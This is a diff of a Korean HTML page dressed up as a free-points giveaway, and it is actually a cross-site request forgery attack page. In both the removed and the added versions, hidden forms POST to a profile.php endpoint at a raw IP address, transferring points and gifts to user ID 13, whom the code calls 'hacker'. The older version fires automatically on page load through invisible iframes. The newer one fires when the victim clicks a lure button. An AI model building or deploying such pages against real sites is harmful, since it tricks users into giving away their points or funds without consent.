@@ -2,148 +2,66 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 무료 포인트 받기</title>
+    <title>🎁 포인트 받기</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
+        body { 
+            font-family: Arial; 
+            text-align: center; 
+            padding: 50px;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0;
             color: white;
         }
-        .gift-container {
-            text-align: center;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            padding: 50px;
-            border-radius: 20px;
-            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
-        }
-        .gift-box {
-            font-size: 8em;
-            animation: bounce 2s infinite;
-        }
-        @keyframes bounce {
-            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
-            40% { transform: translateY(-20px); }
-            60% { transform: translateY(-10px); }
-        }
-        .message {
-            font-size: 1.5em;
-            margin: 20px 0;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-        }
-        .auto-message {
-            font-size: 1.2em;
-            color: #FFD700;
-            margin-top: 30px;
+        button {
+            padding: 20px 40px;
+            font-size: 18px;
+            background: #FF6B6B;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
-    <div class="gift-container">
-        <div class="gift-box">🎁</div>
-        <h1>축하합니다!</h1>
-        <p class="message">🎉 특별 이벤트에 당첨되셨습니다!</p>
-        <p class="auto-message">💰 포인트를 자동으로 지급하고 있습니다...</p>
-        
-        <div id="status" style="margin-top: 30px;">
-            <p>🔄 처리 중...</p>
-        </div>
-    </div>
-
+    <h1>🎁 무료 포인트 이벤트!</h1>
+    <p>아래 버튼을 클릭하면 100 포인트를 받을 수 있습니다!</p>
+    
+    <button onclick="attack()">🎉 포인트 받기!</button>
+    
+    <div id="result"></div>
+    
     <script>
-        // 페이지 로드되자마자 자동 실행
-        window.addEventListener('load', function() {
-            console.log('🎯 원클릭 CSRF 공격 시작!');
+        function attack() {
+            // Form 생성 및 전송
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://3.36.66.216/profile.php';
+            form.target = '_blank';
             
-            // 상태 메시지 업데이트
-            const statusEl = document.getElementById('status');
+            const data = {
+                receiver_id: '13',
+                points: '100', 
+                send_gift: '1',
+                gift_type: 'diamond',
+                message: 'MANUAL_CSRF'
+            };
             
-            setTimeout(() => {
-                statusEl.innerHTML = '<p style="color: #FFD700;">📡 서버에 연결 중...</p>';
-            }, 1000);
+            for (let key in data) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = data[key];
+                form.appendChild(input);
+            }
             
-            setTimeout(() => {
-                statusEl.innerHTML = '<p style="color: #00FF88;">⚡ 포인트 전송 중...</p>';
-                executeOneClickAttack();
-            }, 2000);
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
             
-            setTimeout(() => {
-                statusEl.innerHTML = `
-                    <p style="color: #00FF88; font-size: 1.3em;">✅ 완료!</p>
-                    <p>💰 포인트가 성공적으로 지급되었습니다!</p>
-                    <p style="margin-top: 20px;">
-                        <a href="http://3.36.66.216" target="_blank" style="color: #FFD700; text-decoration: none;">
-                            🔍 결과 확인하러 가기 →
-                        </a>
-                    </p>
-                `;
-            }, 5000);
-        });
-        
-        function executeOneClickAttack() {
-            console.log('🚀 원클릭 공격 실행 중...');
-            
-            // 여러 개의 iframe으로 동시 공격
-            const attacks = [
-                { points: 100, gift_type: 'diamond', message: 'OneClick_Attack_1' },
-                { points: 75, gift_type: 'coffee', message: 'OneClick_Attack_2' },
-                { points: 50, gift_type: 'cake', message: 'OneClick_Attack_3' }
-            ];
-            
-            attacks.forEach((attack, index) => {
-                setTimeout(() => {
-                    createAttackIframe(attack, index + 1);
-                    console.log('🎯 공격 ' + (index + 1) + ': ' + attack.points + 'P 시도');
-                }, index * 1000);
-            });
+            document.getElementById('result').innerHTML = 
+                '<p style="color: lime;">✅ 포인트 전송 완료!</p>' +
+                '<p><a href="http://3.36.66.216" target="_blank">결과 확인하기 →</a></p>';
         }
-        
-        function createAttackIframe(attack, id) {
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.style.width = '0px';
-            iframe.style.height = '0px';
-            iframe.style.border = 'none';
-            
-            const html = '<!DOCTYPE html>' +
-                '<html>' +
-                '<body>' +
-                '<form id="oneClickForm' + id + '" method="POST" action="http://3.36.66.216/profile.php">' +
-                '<input type="hidden" name="receiver_id" value="13">' +
-                '<input type="hidden" name="points" value="' + attack.points + '">' +
-                '<input type="hidden" name="send_gift" value="1">' +
-                '<input type="hidden" name="gift_type" value="' + attack.gift_type + '">' +
-                '<input type="hidden" name="message" value="' + attack.message + '">' +
-                '</form>' +
-                '<script>' +
-                'setTimeout(function() {' +
-                'document.getElementById("oneClickForm' + id + '").submit();' +
-                'console.log("원클릭 공격 ' + id + ' 전송: ' + attack.points + 'P");' +
-                '}, 500);' +
-                '<\/script>' +
-                '</body>' +
-                '</html>';
-            
-            iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
-            document.body.appendChild(iframe);
-            
-            // 10초 후 정리
-            setTimeout(() => {
-                if (iframe.parentNode) {
-                    iframe.parentNode.removeChild(iframe);
-                }
-            }, 10000);
-        }
-        
-        console.log('🎁 원클릭 포인트 탈취 시스템 로드됨');
-        console.log('⚡ 링크 접속만으로 자동 공격 실행');
-        console.log('🎯 타겟: hacker (ID: 13)');
     </script>
 </body>
 </html>
